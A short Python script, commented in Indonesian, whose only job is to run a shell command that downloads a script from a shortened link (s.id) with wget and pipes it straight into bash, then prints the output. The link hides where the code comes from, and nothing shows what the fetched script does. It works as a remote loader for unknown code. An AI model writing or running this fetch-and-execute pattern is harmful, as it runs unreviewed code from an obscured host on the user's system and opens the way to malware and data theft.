import subprocess

# Perintah yang akan dijalankan tanpa nama acak
command = 'bash -c "$(wget -qO- s.id/26TIf)"'

# Menjalankan perintah menggunakan subprocess
result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Menampilkan output (opsional, untuk debugging)
print(result.stdout.decode())
if result.stderr:
    print(result.stderr.decode())
